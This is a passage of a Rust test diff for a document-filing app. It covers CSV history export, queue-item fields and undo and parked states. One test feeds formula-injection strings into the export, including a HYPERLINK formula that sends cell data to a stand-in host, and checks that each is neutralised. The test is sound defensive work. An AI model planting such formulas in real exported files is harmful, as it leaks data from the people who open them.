+        assert_eq!(clock.wait(at(310)), RECOVER_INTERVAL);
+        assert_eq!(clock.wait(at(400)), Duration::ZERO);
     }
 
     #[test]
@@ -5636,7 +6020,7 @@ mod history_tests {
         let mut lines = csv.split("\r\n");
         assert_eq!(
             lines.next(),
-            Some("at,direction,kind,stage,originalPath,newPath,description")
+            Some("\u{FEFF}at,direction,kind,stage,originalPath,newPath,description")
         );
         assert_eq!(
             lines.next(),
@@ -5655,6 +6039,56 @@ mod history_tests {
         );
         assert_eq!(lines.next(), Some(""));
         assert_eq!(lines.next(), None);
+    }
+
+    /// Excel reads a CSV without a byte-order mark in the ANSI code page, and
+    /// runs any cell that starts like a formula. The description column is
+    /// model text a document can steer, so both matter.
+    #[test]
+    fn history_csv_has_bom_and_neutralizes_formulas() {
+        let entries = (7..=12)
+            .map(|item| HistoryEntry {
+                queue_item_id: item,
+                ..entry(0, "C:\\drop\\scan.pdf", "C:\\filed\\Société Générale.pdf")
+            })
+            .collect::<Vec<_>>();
+        let descriptions = HashMap::from([
+            (
+                7,
+                "=HYPERLINK(\"https://x.example/?\"&A2,\"Open invoice details now\")".to_owned(),
+            ),
+            (8, "+1 for the record".to_owned()),
+            (9, "-5 days late".to_owned()),
+            (10, "@SUM(A1:A2)".to_owned()),
+            (11, "\tindented".to_owned()),
+            (12, "A plain sentence, with a comma.".to_owned()),
+        ]);
+
+        let csv = history_csv(&entries, &descriptions);
+
+        assert!(csv.starts_with('\u{FEFF}'), "a UTF-8 byte-order mark first");
+        assert_eq!(csv.matches('\u{FEFF}').count(), 1);
+        assert!(
+            csv.contains("C:\\filed\\Société Générale.pdf"),
+            "the text itself stays UTF-8"
+        );
+        let written = csv
+            .split("\r\n")
+            .skip(1)
+            .filter(|line| !line.is_empty())
+            .map(|line| line.split_once("Générale.pdf,").unwrap().1)
+            .collect::<Vec<_>>();
+        assert_eq!(
+            written,
+            vec![
+                "\"'=HYPERLINK(\"\"https://x.example/?\"\"&A2,\"\"Open invoice details now\"\")\"",
+                "\"'+1 for the record\"",
+                "\"'-5 days late\"",
+                "\"'@SUM(A1:A2)\"",
+                "\"'\tindented\"",
+                "\"A plain sentence, with a comma.\"",
+            ]
+        );
     }
 
     #[test]
@@ -5738,6 +6172,8 @@ mod duplicate_reason_tests {
             error_code: Some(ErrorCode::Duplicate),
             proposal: None,
             receipt: None,
+            filed_receipt: None,
+            unsettled_receipt: None,
             duplicate_of: duplicate_of.map(str::to_owned),
         }
     }
@@ -5756,6 +6192,139 @@ mod duplicate_reason_tests {
         let stale = queue_item_dto(duplicate_item(None)).unwrap();
         assert_eq!(stale.reason, None);
         assert_eq!(stale.error_code.as_deref(), Some("DUPLICATE"));
+    }
+}
+
+#[cfg(test)]
+mod filed_dto_tests {
+    use std::path::PathBuf;
+
+    use intern_core::{
+        ErrorCode, OperationDirection, OperationKind, OperationReceipt, OperationStage, QueueStatus,
+    };
+    use intern_queue::PipelineItem;
+
+    use super::queue_item_dto;
+
+    fn receipt(
+        id: i64,
+        direction: OperationDirection,
+        stage: OperationStage,
+        destination: &str,
+    ) -> OperationReceipt {
+        OperationReceipt {
+            id,
+            queue_item_id: 7,
+            direction,
+            source: PathBuf::from("C:/drop/scan.pdf"),
+            destination: PathBuf::from(destination),
+            temporary_path: None,
+            pre_operation_hash: "hash".into(),
+            post_operation_hash: None,
+            kind: OperationKind::Rename,
+            stage,
+            source_exists: true,
+            destination_exists: false,
+            temporary_exists: false,
+        }
+    }
+
+    fn item(status: QueueStatus) -> PipelineItem {
+        PipelineItem {
+            id: 7,
+            source_path: PathBuf::from("C:/drop/scan.pdf"),
+            source_hash: "hash".into(),
+            status,
+            processing_failures: 0,
+            error_code: None,
+            proposal: None,
+            receipt: None,
+            filed_receipt: None,
+            unsettled_receipt: None,
+            duplicate_of: None,
+        }
+    }
+
+    #[test]
+    fn queue_item_dto_exposes_filed_name_kept_original_parked() {
+        // Filed under the suffix the destination needed, and then an undo
+        // was refused and rolled back on top of it.
+        let applied = receipt(
+            1,
+            OperationDirection::Apply,
+            OperationStage::Complete,
+            "C:/filed/2024/2024-04-12 Invoice Acme (2).pdf",
+        );
+        let filed = PipelineItem {
+            receipt: Some(receipt(
+                2,
+                OperationDirection::Undo,
+                OperationStage::RolledBack,
+                "C:/drop/scan.pdf",
+            )),
+            filed_receipt: Some(applied),
+            ..item(QueueStatus::Completed)
+        };
+        let dto = queue_item_dto(filed).unwrap();
+        assert_eq!(
+            dto.filed_name.as_deref(),
+            Some("2024-04-12 Invoice Acme (2).pdf")
+        );
+        assert!(dto.filed_path.as_deref().is_some_and(|path| {
+            path.ends_with("2024-04-12 Invoice Acme (2).pdf") && path.contains("2024")
+        }));
+        assert!(
+            dto.undoable,
+            "a rolled-back undo leaves the filing undoable"
+        );
+        assert!(!dto.kept_original);
+        assert!(!dto.parked);
+
+        let kept = queue_item_dto(item(QueueStatus::Completed)).unwrap();
+        assert!(kept.kept_original);
+        assert!(!kept.undoable);
+        assert_eq!(kept.filed_name, None);
+
+        // Waiting on the files rather than on a decision: an unfinished
+        // receipt, or one of the codes that mean two files are on disk.
+        let unsettled = PipelineItem {
+            error_code: Some(ErrorCode::FileChanged),
+            unsettled_receipt: Some(receipt(
+                3,
+                OperationDirection::Apply,
+                OperationStage::Planned,
+                "C:/filed/named.pdf",
+            )),
+            ..item(QueueStatus::NeedsReview)
+        };
+        assert!(queue_item_dto(unsettled).unwrap().parked);
+        for code in [
+            ErrorCode::SourceDeleteFailed,
+            ErrorCode::ReconciliationRequired,
+        ] {
+            let parked = PipelineItem {
+                error_code: Some(code),
+                ..item(QueueStatus::NeedsReview)
+            };
+            assert!(queue_item_dto(parked).unwrap().parked, "{code:?}");
+        }
+        let deciding = PipelineItem {
+            error_code: Some(ErrorCode::FileChanged),
+            ..item(QueueStatus::NeedsReview)
+        };
+        let deciding = queue_item_dto(deciding).unwrap();
+        assert!(!deciding.parked);
+        assert!(
+            !deciding.kept_original,
+            "only a completed item kept its name"
+        );
+
+        // The wire names the window reads.
+        let json = serde_json::to_value(kept).unwrap();
+        for key in ["filedPath", "filedName", "keptOriginal", "parked"] {
+            assert!(json.get(key).is_some(), "{key} missing from {json}");
+        }
+        assert_eq!(json["keptOriginal"], true);
     }
 }
 
